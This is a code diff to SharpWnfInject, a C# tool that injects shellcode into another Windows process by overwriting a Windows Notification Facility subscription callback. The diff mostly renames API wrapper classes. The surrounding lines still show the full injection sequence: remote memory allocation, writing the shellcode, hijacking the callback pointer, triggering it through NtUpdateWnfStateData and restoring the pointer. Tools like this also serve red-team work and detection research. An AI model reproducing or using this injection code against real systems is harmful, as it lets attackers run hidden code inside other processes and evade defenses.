@@ -9,7 +9,7 @@ using SharpWnfInject.Interop;
 
 namespace SharpWnfInject.Library
 {
-    class Modules
+    internal class Modules
     {
         public static bool InjectShellcode(
             int pid,
@@ -271,13 +271,13 @@ namespace SharpWnfInject.Library
             if (is64bit)
             {
                 nOffsetCallback = (uint)Marshal.OffsetOf(
-                    typeof(Win32Struct.WNF_USER_SUBSCRIPTION64),
+                    typeof(WNF_USER_SUBSCRIPTION64),
                     "Callback");
             }
             else
             {
                 nOffsetCallback = (uint)Marshal.OffsetOf(
-                    typeof(Win32Struct.WNF_USER_SUBSCRIPTION32),
+                    typeof(WNF_USER_SUBSCRIPTION32),
                     "Callback");
             }
 
@@ -301,12 +301,12 @@ namespace SharpWnfInject.Library
 
             Console.WriteLine("[>] Trying to allocate shellcode buffer in remote process.");
 
-            pShellcode = Win32Api.VirtualAllocEx(
+            pShellcode = NativeMethods.VirtualAllocEx(
                 proc.GetProcessHandle(),
                 IntPtr.Zero,
                 (uint)shellcode.Length,
-                Win32Const.MemoryAllocationFlags.MEM_COMMIT | Win32Const.MemoryAllocationFlags.MEM_RESERVE,
-                Win32Const.MemoryProtectionFlags.PAGE_EXECUTE_READ);
+                MemoryAllocationFlags.MEM_COMMIT | MemoryAllocationFlags.MEM_RESERVE,
+                MemoryProtectionFlags.PAGE_EXECUTE_READ);
 
             if (pShellcode == IntPtr.Zero)
             {
@@ -327,7 +327,7 @@ namespace SharpWnfInject.Library
 
             lpNumberOfBytesWritten = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(uint)));
 
-            if (!Win32Api.WriteProcessMemory(
+            if (!NativeMethods.WriteProcessMemory(
                 proc.GetProcessHandle(),
                 pShellcode,
                 shellcode,
@@ -352,7 +352,7 @@ namespace SharpWnfInject.Library
 
             Console.WriteLine("[>] Trying to overwrite callback function pointer.");
 
-            if (!Win32Api.WriteProcessMemory(
+            if (!NativeMethods.WriteProcessMemory(
                     proc.GetProcessHandle(),
                     pCallbackPointer,
                     is64bit ? BitConverter.GetBytes(pShellcode.ToInt64()) : BitConverter.GetBytes(pShellcode.ToInt32()),
@@ -371,7 +371,7 @@ namespace SharpWnfInject.Library
                 Console.WriteLine("[+] Callback function pointer is overwritten successfully.");
             }
 
-            ntstatus = Win32Api.NtUpdateWnfStateData(
+            ntstatus = NativeMethods.NtUpdateWnfStateData(
                 in stateNameToInject,
                 IntPtr.Zero,
                 0,
@@ -380,7 +380,7 @@ namespace SharpWnfInject.Library
                 0,
                 0);
 
-            if (ntstatus != Win32Const.STATUS_SUCCESS)
+            if (ntstatus != Win32Consts.STATUS_SUCCESS)
             {
                 Console.WriteLine("[-] Failed to update WNF State Data.");
                 Console.WriteLine("    |-> {0}", Helpers.GetWin32ErrorMessage(ntstatus, true));
@@ -392,7 +392,7 @@ namespace SharpWnfInject.Library
 
             Console.WriteLine("[>] Trying to revert callback function pointer.");
 
-            if (!Win32Api.WriteProcessMemory(
+            if (!NativeMethods.WriteProcessMemory(
                     proc.GetProcessHandle(),
                     pCallbackPointer,
                     is64bit ? BitConverter.GetBytes(pCallbackOrigin.ToInt64()) : BitConverter.GetBytes(pCallbackOrigin.ToInt32()),
@@ -408,7 +408,7 @@ namespace SharpWnfInject.Library
 
             proc.Dispose();
 
-            return (ntstatus == Win32Const.STATUS_SUCCESS);
+            return (ntstatus == Win32Consts.STATUS_SUCCESS);
         }
     }
 }
